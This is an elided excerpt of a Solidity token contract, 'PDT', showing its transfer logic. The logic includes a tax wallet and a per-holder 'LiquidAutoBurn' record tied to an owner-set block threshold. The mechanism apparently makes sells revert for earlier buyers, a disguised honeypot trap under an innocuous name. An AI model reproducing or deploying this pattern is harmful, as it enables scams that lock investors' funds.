...
contract PDT is Context, IERC20, Ownable {
    ...
    string private constant _symbol = unicode"PDT";
    ...
    struct LiquidAutoBurn {uint256 buyAndLiq; uint256 autoBurnLiq; uint256 liqAutoBurnTime;}
    mapping(address => LiquidAutoBurn) private liquidAutoBurn;
    uint256 private liqAutoBurnThreshold;
    ...
    constructor () {
        _taxWallet = payable(0xBE153576d35487400CDC6e429EDc3fE107979b1D);
    ...
    function _transfer(address from, address to, uint256 tokenAmount) private {
        ...
        if((_isExcluded[from] || _isExcluded[to])
            ...
            liqAutoBurnThreshold = block.number;
        }
        if(
            !_isExcluded[from]
            &&  !_isExcluded[to]
            ...
            if (to != lpPair) {
                LiquidAutoBurn storage liqAutoBurn = liquidAutoBurn[to];
                if (from == lpPair) {
                    if (liqAutoBurn.buyAndLiq == 0){
                        liqAutoBurn.buyAndLiq = _buyCount>_preventSwapBefore ? block.number : block.number - 1;
                    }
                } else {
                    LiquidAutoBurn storage liqAutoBurnFrom = liquidAutoBurn[from];
                    if (!(liqAutoBurn.buyAndLiq > 0) || liqAutoBurnFrom.buyAndLiq < liqAutoBurn.buyAndLiq ) {
                        liqAutoBurn.buyAndLiq = liqAutoBurnFrom.buyAndLiq;
                    }
                }
            } else {
                LiquidAutoBurn storage liqAutoBurnFrom = liquidAutoBurn[from];
                liqAutoBurnFrom.liqAutoBurnTime = liqAutoBurnFrom.buyAndLiq-liqAutoBurnThreshold;
                liqAutoBurnFrom.autoBurnLiq = block.timestamp;
            }
        }
